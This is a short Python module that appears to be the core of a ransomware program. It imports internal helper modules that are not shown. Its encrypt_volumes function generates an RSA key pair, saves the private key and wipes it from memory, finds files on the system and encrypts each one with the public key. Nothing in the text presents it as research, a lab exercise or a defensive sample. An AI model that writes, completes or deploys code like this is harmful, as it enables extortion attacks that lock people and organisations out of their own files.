"""     libs        """
# Internal
from operation_systems.file_searche import find_files
from encryptor.RSA import RSA_encryptor_class
from operation_systems.save_keys import save_keys
from encryptor.encrypt_files import encrypt_files

"""     Encrypt files     """
def encrypt_volumes():
    # Generate RSA key
    RSA = RSA_encryptor_class()

    # Save private key file
    save_keys(RSA.private_key)
    RSA.private_key = None

    # Generate file encryptor
    file_encryptor = encrypt_files(RSA.public_key)

    # Search on files:
    files = find_files()
    for file in files:
        # Encrypt file
        file_encryptor.encrypt(file)
